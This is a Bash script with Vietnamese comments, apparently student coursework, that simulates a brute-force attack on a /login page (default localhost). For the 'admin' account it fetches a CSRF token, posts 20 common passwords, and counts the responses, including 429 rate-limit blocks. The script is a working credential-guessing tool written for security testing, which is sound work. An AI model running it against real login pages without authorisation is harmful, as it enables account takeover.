#!/bin/bash
# ==============================================================================
# Script: scripts/simulate_bruteforce.sh
# Muc dich: Mo phong tan cong do mat khau (Brute Force) vao endpoint /login
#           phuc vu hoc tap va kiem thu an toan thong tin tren he thong.
# Tac gia: Doan Ngoc Manh (DTC245180048)
# ==============================================================================

set -euo pipefail

TARGET_URL="${1:-https://localhost/login}"
COOKIE_JAR="/tmp/cookie_bf.txt"
rm -f "$COOKIE_JAR"

PASSWORDS=(
  "admin123"
  "123456"
  "password"
  "admin@123"
  "cinema123"
  "qwerty"
  "letmein"
  "admin2024"
  "cinema@2024"
  "root123"
  "master2024"
  "welcome1"
  "iloveyou"
  "superman"
  "pass1234"
  "secret12"
  "dragon2024"
  "shadow99"
  "sunshine"
  "adminadmin"
)

TOTAL=${#PASSWORDS[@]}
echo "================================================================================"
echo "BAT DAU MO PHONG TAN CONG BRUTE FORCE VAO TRANG DANG NHAP"
echo "Target URL   : $TARGET_URL"
echo "Target User  : admin"
echo "Total Request: $TOTAL"
echo "Thoi gian    : $(date '+%Y-%m-%d %H:%M:%S')"
echo "================================================================================"

COUNT_200=0
COUNT_302=0
COUNT_429=0
COUNT_OTHER=0

for i in "${!PASSWORDS[@]}"; do
  idx=$((i + 1))
  pwd="${PASSWORDS[$i]}"
  TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

  # 1. Lay CSRF token va Session Cookie tu form /login
  GET_RESP=$(curl -sk -i -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$TARGET_URL")
  GET_STATUS=$(echo "$GET_RESP" | head -n 1 | awk '{print $2}')
  
  if [ "$GET_STATUS" -eq 429 ]; then
    echo "[$TIMESTAMP] [$idx/$TOTAL] User: admin | Pass: ${pwd} -> HTTP Status: 429 (Too Many Requests - Blocked by Rate Limit)"
    COUNT_429=$((COUNT_429 + 1))
    sleep 0.5
    continue
  fi

  CSRF_TOKEN=$(echo "$GET_RESP" | grep -o 'name="_csrf" value="[^"]*"' | head -n 1 | cut -d'"' -f4 || echo "")
  
  if [ -z "$CSRF_TOKEN" ]; then
    echo "[$TIMESTAMP] [$idx/$TOTAL] User: admin | Pass: $pwd | WARNING: Khong lay duoc CSRF token (HTTP $GET_STATUS)"
    COUNT_OTHER=$((COUNT_OTHER + 1))
    sleep 0.5
    continue
  fi

  # 2. Gui yeu cau POST dang nhap voi mat khau sai
  HTTP_CODE=$(curl -sk -c "$COOKIE_JAR" -b "$COOKIE_JAR" -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
    -d "username=admin&password=${pwd}&_csrf=${CSRF_TOKEN}")

  echo "[$TIMESTAMP] [$idx/$TOTAL] User: admin | Pass: ${pwd} -> HTTP Status: $HTTP_CODE"

  if [ "$HTTP_CODE" -eq 200 ]; then
    COUNT_200=$((COUNT_200 + 1))
  elif [ "$HTTP_CODE" -eq 302 ]; then
    COUNT_302=$((COUNT_302 + 1))
  elif [ "$HTTP_CODE" -eq 429 ]; then
    COUNT_429=$((COUNT_429 + 1))
  else
    COUNT_OTHER=$((COUNT_OTHER + 1))
  fi

  # Gian cach ~0.5 giay giua cac request theo yeu cau de bai
  sleep 0.5
done

rm -f "$COOKIE_JAR"

echo "================================================================================"
echo "KET THUC MO PHONG BRUTE FORCE"
echo "Tong so request da gui : $TOTAL"
echo "HTTP 200 (Login Failed)  : $COUNT_200"
echo "HTTP 302 (Redirect)      : $COUNT_302"
echo "HTTP 429 (Too Many Req)  : $COUNT_429"
echo "HTTP Khac                : $COUNT_OTHER"
echo "Thoi gian ket thuc       : $(date '+%Y-%m-%d %H:%M:%S')"
echo "================================================================================"
